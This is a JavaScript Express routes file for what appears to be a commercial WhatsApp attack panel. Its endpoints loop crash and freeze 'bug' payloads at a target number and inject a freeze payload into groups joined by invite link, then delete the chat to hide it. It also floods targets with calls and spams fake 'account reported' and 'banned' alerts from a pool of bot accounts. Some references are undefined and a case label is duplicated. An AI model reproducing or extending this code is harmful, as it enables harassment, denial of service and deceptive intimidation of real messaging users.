const crypto = require('crypto');
const express = require('express');
const { 
  activeConnections,
  biz,
  mess,
  prepareAuthFolders,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  // Bug functions
  bleng,
  crashbeta,
  overflowfc,
  blankmsg,
  crashfcnewxryy,
  PrePortDoc,
  BetaExploit,
AstecTest,
  IosCrash,
  DocFC,
  tesss,
  StravasFC,
  bulldozerV2,
  ZenoCrashNoClick,
  OneKanjutTry,
  combo2,
  combo3,
  epcinjir,
  onemsg,
  fcinvisotax,
  AhhCrot,
  DileyInvisi,
  focusedimfocused,
  Nyawit,
  MarkNyawit,
  producInvite,
  FreezePackk,
  InTransitBusiness,
  CrashClick,
  DelayCarousel,
  gsGlx,
  sticker9ack,
  blank,
  intVerify,
  permenCall,
  crsh,
  crssh,
  delaynnnnNew,
  fcno,
  XxContact,
  ioz,
  // Session helpers
  sleep,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder,
  // fungsi baru
  VnXFcCodeMetaNew,
  VnXDelayXBulldoNew,
  denglay,
  BuritMambu,
} = require('../services/whatsappService');
const { loadDatabase, saveDatabase } = require('../services/databaseService');
const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');
const { spamCooldown } = require('../utils/globals');
const path = require('path');
const fs = require('fs');

// Import WhatsApp modules
const { 
  makeWASocket, 
  useMultiFileAuthState, 
  DisconnectReason, 
  fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys");
const pino = require('pino');

const router = express.Router();

// ... (kode sebelumnya di whatsappRoutes.js)

// Group Bug endpoint - Hanya untuk VIP dan Owner (Single Response)
router.get("/groupBug", async (req, res) => {
  const { key, linkGroup } = req.query; // Hapus 'bug' dari query

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  if (!["vip", "owner"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP or Owner role required." });
  }

  // 2. Validasi Parameter (hanya linkGroup yang diperiksa)
  if (!linkGroup) return res.status(400).json({ valid: false, message: "Group link is required" });

  // Ekstrak kode undangan dari link grup
  const match = linkGroup.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.status(400).json({ valid: false, message: "Invalid group link format" });
  const inviteCode = match[1];

  // 3. Cek ketersediaan private session
  const userSessions = getUserActiveSessions(user.username);
  
  if (userSessions.length === 0) {
    return res.json({ 
      valid: false, 
      message: "Private sender unavailable. Please add a sender first." 
    });
  }

  // Pilih session acak dari milik pengguna
  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  // 4. Jalankan seluruh proses dan tunggu hingga selesai sebelum merespons
  try {
    const result = await new Promise((resolve, reject) => {
      // Gunakan setImmediate agar tidak memblokir event loop, tapi tetap tunggu hasilnya
      setImmediate(async () => {
        try {
          logger.info(`[📤 GROUP BUG] Starting process with session ${sessionName} for group ${inviteCode}`);

          let finalResult = {
            success: false,
            canSendMessage: false,
            groupInfo: null,
            error: null
          };

          // 4.1. Bergabung dengan grup
          let groupJid;
          try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
            logger.info(`[✅ GROUP BUG] Successfully joined group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to join group: ${err.message}`);
            finalResult.error = `Failed to join group: ${err.message}`;
            return resolve(finalResult);
          }

          // Tunggu sebentar untuk memastikan koneksi stabil
          await sleep(3000);

          // 4.2. Ambil metadata grup
          let groupMetadata;
          try {
            groupMetadata = await sock.groupMetadata(groupJid);
            logger.info(`[✅ GROUP BUG] Retrieved group metadata`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to get group metadata: ${err.message}`);
            // Lanjutkan meskipun gagal ambil metadata
          }

          // 4.3. Coba kirim pesan ke grup
          try {
            await sock.sendMessage(groupJid, { text: "Halo" });
            finalResult.canSendMessage = true;
            logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to send message to group: ${err.message}`);
            logger.info(`[ℹ️ GROUP BUG] Group might have chat disabled`);
          }

          // 4.4. Kirim kombinasi bug yang sudah di-hardcode jika pesan berhasil dikirim
          if (finalResult.canSendMessage) {
            try {
              logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
              await FreezePackk(sock, groupJid);
              await sock.sendMessage(groupJid, { text: "Eh" });
              logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
            } catch (err) {
              logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
            }
          }

          // 4.5. Keluar dari grup
          try {
            await sock.groupLeave(groupJid);
            logger.info(`[✅ GROUP BUG] Successfully left group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to leave group: ${err.message}`);
          }

          // 4.6. Hapus chat grup dari WhatsApp
          try {
            await sock.chatModify({
              delete: true,
              lastMessages: [{
                key: {
                  remoteJid: groupJid,
                  fromMe: true,
                  id: "1"
                },
                messageTimestamp: Date.now()
              }]
            }, groupJid);
            logger.info(`[✅ GROUP BUG] Successfully deleted group chat`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to delete group chat: ${err.message}`);
          }

          // Siapkan respons akhir
          finalResult.success = true;
          if (groupMetadata) {
            finalResult.groupInfo = {
              id: groupMetadata.id,
              subject: groupMetadata.subject,
              desc: groupMetadata.desc,
              owner: groupMetadata.owner,
              creation: groupMetadata.creation,
              participants: groupMetadata.participants.length
            };
          }
          
          resolve(finalResult);

        } catch (error) {
          logger.error(`[❌ GROUP BUG ERROR] ${error.message}`);
          reject(error);
        }
      });
    });

    // 5. Kirim respons akhir HANYA SATU KALI setelah semua proses selesai
    res.json(result);

  } catch (error) {
    logger.error(`[❌ GROUP BUG FATAL ERROR] ${error.message}`);
    res.status(500).json({ valid: false, message: "An internal server error occurred." });
  }
});

// ... (kode setelahnya di whatsappRoutes.js)
// Send bug to target
router.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  logger.info(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    logger.info("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  // Role-based Cooldown
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    logger.info(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // Respon duluan
  user.lastSend = now;
  saveDatabase(db);
  logger.info(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // Kirim bug di background
  setImmediate(async () => {
    try {
      // Gunakan fungsi yang sudah diimpor untuk mendapatkan session
      const sock = await checkActiveSessionInFolder(user.username, userIsVipOrOwner);
      
      if (!sock) {
        logger.warn(`[❌ BUG] Tidak ada session aktif untuk user ${user.username}`);
        return;
      }
      
      const targetJid = target + "@s.whatsapp.net";
      logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${targetJid}`);

      // Kirim bug berdasarkan tipe (sesuai bug_id di constants)
      switch (bug) {

        // ── BUGS ──
        case "AhhCrot":
          for (let i = 0; i < 77; i++) {
            await AhhCrot(sock, targetJid);
            await sleep(1500);
            await bleng(sock, targetJid);
            await sleep(1500);
            await denglay(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "bleng":
          for (let i = 0; i < 25; i++) {
            await bleng(sock, targetJid);
            await sleep(1200);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "denglay":
          for (let i = 0; i < 88; i++) {
            await denglay(sock, targetJid);
            await sleep(1500);
            await tesss(sock, targetJid);
            await sleep(1500);
            await sticker9ack(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "blankmsg":
          for (let i = 0; i < 77; i++) {
            await blankmsg(sock, targetJid);
            await sleep(1500);
            await R9X(sock, targetJid);
            await sleep(1500);
            await AstecTest(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "crashbeta":
          for (let i = 0; i < 66; i++) {
            await crashbeta(sock, targetJid);
            await sleep(1500);
            await crashfcnewxryy(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
            
          }
          break;
          case "MarkNyawit":
          for (let i = 0; i < 60; i++) {
            await MarkNyawit(sock, targetJid);
            await sleep(1500);
            await Nyawit(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;
          case "IosCrash":
          for (let i = 0; i < 30; i++) {
            await IosCrash(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;
          case "crashfcnewxryy":
          for (let i = 0; i < 15; i++) {
            await BetaExploit(sock, targetJid);
            await sleep(1500);
            await ZenoCrashNoClick(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        // ── payload ──
        
        case "bleng":
          for (let i = 0; i < 30; i++) {
            await bleng(sock, targetJid);
            await sleep(1200);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
            await overflowfc(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "epcinjir":
          for (let i = 0; i < 30; i++) {
            await epcinjir(sock, targetJid);
            await sleep(1200);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "BuritMambu":
          for (let i = 0; i < 20; i++) {
            await BuritMambu(sock, targetJid);
            await sleep(1200);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        case "ZenoCrashNoClick":
          for (let i = 0; i < 30; i++) {
            await ZenoCrashNoClick(sock, targetJid);
            await sleep(1500);
            await AhhCrot(sock, targetJid);
            await sleep(1500);
          }
          break;

        default:
          logger.warn(`[⚠️ BUG] bug_id '${bug}' tidak dikenal, dilewati.`);
          break;
      }

      logger.info(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
    } catch (err) {
      logger.error(`[❌ BUG ERROR] ${err.message}`);
    }
  });
});

// Spam call to target
router.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  const role = user.role || "member";
  const maxQty = MAX_QUANTITIES[role] || 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  // Dapatkan session aktif
  let bizSessions = [];
  
  // Jika user VIP/Owner, coba gunakan session VIP terlebih dahulu
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      if (biz[sessionName]) {
        bizSessions.push({
          sessionName: sessionName,
          sock: sock,
          type: "Business",
          isVip: true
        });
      }
    }
  }
  
  // Jika tidak ada session VIP atau user bukan VIP/Owner, gunakan session milik pengguna
  if (bizSessions.length === 0) {
    const userSessions = getUserActiveSessions(user.username);
    bizSessions = userSessions.filter(s => s.type === "Business");
  }
  
  if (bizSessions.length === 0) {
    return res.json({ valid: false, message: "No business session available" });
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    // Pilih session acak
    const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
    const sock = randomSession.sock;
    const sessionName = randomSession.sessionName;
    
    // Unblock target terlebih dahulu
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    logger.info(`[✅ FIRST SPAM CALL] to ${jid} from ${sessionName}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          // Pilih session acak
          const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
          const sock = randomSession.sock;
          
          // Unblock target terlebih dahulu
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");

          logger.info(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${randomSession.sessionName}`);
        } catch (err) {
          logger.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logger.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

// Get active WhatsApp connections
router.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);
  
  let privateConns = []; // Session milik pengguna sendiri
  let globalConns = [];  // Session global (VIP)
  
  // Jika user VIP/Owner, sertakan session VIP sebagai session global
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      const type = biz[sessionName] ? "Business" : (mess[sessionName] ? "Messenger" : "Unknown");
      globalConns.push({
        sessionName: sessionName,
        type: type,
        isActive: true,
        isVip: true,
        owner: "global" // Menandakan ini adalah session global
      });
    }
  }
  
  // Dapatkan session milik user
  const userConns = getUserActiveSessions(user.username);
  
  // PERBAIKAN: Hapus properti 'sock' untuk menghindari circular reference
  const safeUserConns = userConns.map(conn => {
    // Menggunakan destructuring untuk membuat objek baru tanpa properti 'sock'
    const { sock, ...safeConn } = conn; 
    return {
      ...safeConn,
      owner: user.username // Menandakan ini adalah session milik user
    };
  });

  privateConns = [...safeUserConns];
    
  logger.info(user.username);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,  // Session milik pengguna sendiri
      global: globalConns     // Session global (VIP)
    }
  });
});

// ... (kode sebelumnya di whatsappRoutes.js)

// Custom Bug endpoint - Hanya untuk VIP dan Owner
router.get("/customBug", async (req, res) => {
  const { key, target, bug, qty, delay, senderType } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  if (!["vip", "owner"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP or Owner role required." });
  }

  // 2. Validasi Parameter
  const cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget) return res.status(400).json({ valid: false, message: "Target is required" });
  if (!bug) return res.status(400).json({ valid: false, message: "Bug list is required" });
  if (!["global", "private"].includes(senderType)) return res.status(400).json({ valid: false, message: "Invalid senderType. Must be 'global' or 'private'." });

  const bugsToSend = bug.split(',').map(b => b.trim());
  const parsedQty = parseInt(qty) || 1;
  const parsedDelay = parseInt(delay) || 100; // Default delay 100ms jika tidak ditentukan

  // 3. Logika berdasarkan SenderType
  let sock, sessionName, maxQty, effectiveDelay;

  if (senderType === "global") {
    maxQty = 10;
    effectiveDelay = 500; // Abaikan delay user, gunakan 500ms
    sock = getRandomVipConnection();
    
    // Cek ketersediaan session global
    if (!sock) {
      return res.json({ valid: false, message: "Selected sender type (global) not available right now." });
    }
    sessionName = "VIP Session";
  } else { // private
    maxQty = 200;
    effectiveDelay = Math.max(parsedDelay, 10); // Delay minimal 10ms
    const userSessions = getUserActiveSessions(user.username);
    
    // Cek ketersediaan session private
    if (userSessions.length === 0) {
      return res.json({ valid: false, message: "Selected sender type (private) not available right now." });
    }
    const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
    sock = randomSession.sock;
    sessionName = randomSession.sessionName;
  }

  // 4. Validasi Qty akhir
  if (parsedQty > maxQty) {
    return res.json({
      valid: false,
      message: `Quantity too high. Max allowed for sender type '${senderType}' is ${maxQty}.`
    });
  }

  // 5. Respon sukses segera
  res.json({
    valid: true,
    message: `Attack queued on ${cleanTarget} using ${senderType} sender.`,
    details: {
      target: cleanTarget,
      senderType: senderType,
      bugs: bugsToSend,
      qty: parsedQty,
      delay: effectiveDelay
    }
  });

  // 6. Eksekusi di background
  setImmediate(async () => {
    try {
      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);

      // Pemetaan nama bug ke fungsi
      const bugFunctions = {
        'bleng': blank,
        'overflowfc': CrashClick,
        'crashfcnewxryy': XxContact,
        'fcno': fcno,
        'crashbeta': epcinjir,
        'producinvite': producinvite, 
          'crashbs': InTransitBusiness,
        'delay': denglay,
          'delayv2': gsGlx,
          'VnXFcCodeMetaNew':VnXFcCodeMetaNew,
          'VnXDelayXBulldoNew':VnXDelayXBulldoNew,
      };

      for (let i = 0; i < parsedQty; i++) {
        for (const bugName of bugsToSend) {
          const bugFunction = bugFunctions[bugName];
          if (bugFunction) {
            await bugFunction(sock, targetJid);
            await sleep(effectiveDelay);
          } else {
            logger.warn(`[⚠️ CUSTOM BUG] Unknown bug function: ${bugName}`);
          }
        }
      }
      logger.info(`[✅ CUSTOM BUG] Attack on ${targetJid} completed.`);
    } catch (err) {
      logger.error(`[❌ CUSTOM BUG ERROR] ${err.message}`);
    }
  });
});

//END POINT REPORT WA
router.post("/report", async (req, res) => {
  const { key, target, count } = req.body;

  // 1. Validasi Autentikasi Key
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ success: false, message: "User not found" });

  // 2. Konfigurasi Role & Cooldown
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] !== undefined ? ROLE_COOLDOWNS[role] : 300;
  
  // Batas Maksimal Report (Hardcoded 500 atau sesuai MAX_QUANTITIES jika ingin dinamis)
  const maxAllowed = 500; 

  // Pengecekan Input Jumlah
  if (parseInt(count) > maxAllowed) {
    return res.json({ 
      success: false, 
      message: `Max quantity for report is ${maxAllowed}` 
    });
  }

  // Pengecekan Cooldown
  const now = Date.now();
  const lastReport = user.lastReport || 0;
  const diffSeconds = Math.floor((now - lastReport) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      success: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      message: `Cooldown! Please wait ${cooldownSeconds - diffSeconds}s more.`
    });
  }

  // 3. Kumpulkan Sesi WA Aktif (Milik User + Global/VIP)
  const userSessions = getUserActiveSessions(user.username).map(s => s.sock);
  const isPrivileged = ["vip", "owner"].includes(user.role);
  let allActiveSocks = [...userSessions];

  if (isPrivileged) {
    const vipConns = getActiveVipConnections();
    Object.values(vipConns).forEach(sock => allActiveSocks.push(sock));
  }

  if (allActiveSocks.length === 0) {
    return res.status(400).json({ success: false, message: "No active WhatsApp sessions found." });
  }

  // 4. Update Database (Set Waktu Report Terakhir)
  user.lastReport = now;
  saveDatabase(db);

  // 5. Kirim Respon Segera
  res.json({ 
    success: true, 
    message: "Attack process started in background", 
    total_bots: allActiveSocks.length,
    total_sent: count 
  });

  // 6. Jalankan Proses Spam di Background
  let cleanTarget = target.replace(/\D/g, "");
  if (cleanTarget.startsWith("+")) cleanTarget = "+" + cleanTarget.slice(1);
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  const reportTexts = [
    "⚠️ System: Account reported for violation #8821",
    "Security Alert: Suspicious activity detected.",
    "Banned Request: Violation of Terms of Service.",
    "Report ID: " + Math.random().toString(36).substring(7)
  ];

  setImmediate(async () => {
    logger.info(`[🚀 REPORT] Target: ${targetJid} | Qty: ${count} | Bots: ${allActiveSocks.length}`);
    
    for (let i = 0; i < parseInt(count); i++) {
      // Pilih bot secara bergiliran (Round Robin)
      const currentSock = allActiveSocks[i % allActiveSocks.length];
      const randomMsg = reportTexts[Math.floor(Math.random() * reportTexts.length)];
      
      try {
        await currentSock.sendMessage(targetJid, { text: randomMsg });
        // Jeda kecil 300-800ms agar bot lebih awet
        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 500) + 300)); 
      } catch (err) {
        logger.error(`[❌ REPORT ERR] Bot ${i % allActiveSocks.length}: ${err.message}`);
      }
    }
  });
});

// ... (kode setelahnya di whatsappRoutes.js)
// Get pairing code for new WhatsApp session (FIXED - wait for socket ready)
router.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌] Key tidak valid.");
    return res.json({ valid: false, message: "Key tidak valid" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User tidak ditemukan" });
  if (!number) return res.status(400).json({ error: "Number is required" });

  // Bersihkan nomor - hanya angka
  const cleanNumber = number.replace(/\D/g, "");
  if (!cleanNumber || cleanNumber.length < 8) {
    return res.status(400).json({ error: "Format nomor tidak valid" });
  }

  try {
    const sessionDir = path.join('permenmd', user.username, cleanNumber);
    fs.mkdirSync(path.join('permenmd', user.username), { recursive: true });
    fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    // Jika sudah terdaftar, langsung reconnect
    if (state.creds.registered) {
      return res.json({ valid: false, message: "Nomor sudah terdaftar/terhubung" });
    }

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: undefined,
      markOnlineOnConnect: false,
      syncFullHistory: false,
    });

    sock.ev.on("creds.update", saveCreds);

    // Tunggu socket connecting ke WA server dulu (~2 detik)
    await waiting(2000);

    let code;
    try {
      code = await sock.requestPairingCode(cleanNumber);
    } catch (pairErr) {
      logger.error("requestPairingCode error:", pairErr.message);
      sock.end();
      return res.status(500).json({ error: "Gagal request pairing code: " + pairErr.message });
    }

    if (!code) {
      sock.end();
      return res.json({ valid: false, message: "Pairing code tidak diterima dari WA" });
    }

    logger.info(`🔑 Pairing code ${cleanNumber}: ${code}`);

    // Handle koneksi setelah pairing
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "open") {
        activeConnections[cleanNumber] = sock;
        logger.info(`✅ ${cleanNumber} berhasil connect`);
        // Simpan session
        const src = path.join(sessionDir, 'creds.json');
        const dst = path.join('permenmd', user.username, `${cleanNumber}.json`);
        try {
          if (fs.existsSync(src)) fs.copyFileSync(src, dst);
        } catch (e) { logger.error("Copy creds error:", e.message); }
      }
      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          await waiting(3000);
          pairingWa(cleanNumber, user.username).catch(() => {});
        } else {
          delete activeConnections[cleanNumber];
        }
      }
    });

    return res.json({ valid: true, number: cleanNumber, pairingCode: code });

  } catch (err) {
    logger.error("Error in getPairing:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Helper function to wait
function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper function for pairing WhatsApp (reconnect setelah pairing sukses)
async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    logger.warn(`[pairingWa] Max attempt reached for ${number}`);
    return false;
  }

  const sessionDir = path.join('permenmd', owner, number);
  fs.mkdirSync(path.join('permenmd', owner), { recursive: true });
  fs.mkdirSync(sessionDir, { recursive: true });

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: undefined,
      markOnlineOnConnect: false,
      syncFullHistory: false,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        activeConnections[number] = sock;
        logger.info(`✅ [pairingWa] ${number} connected (attempt ${attempt})`);
        const src = path.join(sessionDir, 'creds.json');
        const dst = path.join('permenmd', owner, `${number}.json`);
        try {
          await waiting(2000);
          if (fs.existsSync(src)) {
            fs.writeFileSync(dst, fs.readFileSync(src));
            logger.info(`✅ Session saved: ${dst}`);
          }
        } catch (e) { logger.error(`Copy creds error: ${e.message}`); }
      }

      if (connection === "close") {
        const code = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = code === DisconnectReason.loggedOut;
        logger.info(`🔄 [pairingWa] ${number} closed (code=${code}, attempt=${attempt})`);
        if (!isLoggedOut) {
          await waiting(3000);
          pairingWa(number, owner, attempt + 1).catch(() => {});
        } else {
          delete activeConnections[number];
          logger.info(`🗑️ [pairingWa] ${number} logged out, session removed`);
        }
      }
    });

  } catch (err) {
    logger.error(`[pairingWa] Error for ${number}: ${err.message}`);
    await waiting(3000);
    return pairingWa(number, owner, attempt + 1);
  }

  return null;
}

// Helper function to detect WhatsApp type from credentials
function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

// Helper function to get active connections in a folder
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${subfolderName}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        isActive: true,
        type: detectWATypeFromCreds(path.join(folderPath, file)) // Add WA type
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName}`);
    }
  }

  return activeCreds;
}

// FUNGSI INI DIHAPUS KARENA SUDAH DIIMPOR DARI SERVICE
// async function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) { ... }

// Helper function to get user's active sessions
function getUserActiveSessions(username) {
  const folderPath = path.join('permenmd', username);
  
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const userSessions = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${username}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      const credsPath = path.join(folderPath, file);
      const type = detectWATypeFromCreds(credsPath);
      
      userSessions.push({
        sessionName: sessionName,
        sock: activeConnections[sessionName],
        type: type,
        isActive: true
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName} (${type})`);
    }
  }

  return userSessions;
}

async function loadAllSessions() {
  const users = fs.existsSync("permenmd")
    ? fs.readdirSync("permenmd")
    : [];

  for (const username of users) {
    const userFolder = path.join("permenmd", username);
    const files = fs.readdirSync(userFolder).filter(f => f.endsWith(".json"));

    for (const file of files) {
      const number = path.basename(file, ".json");
      await pairingWa(number, username);
      logger.info(`♻ Reloaded session ${number}`);
    }
  }
}

module.exports = router;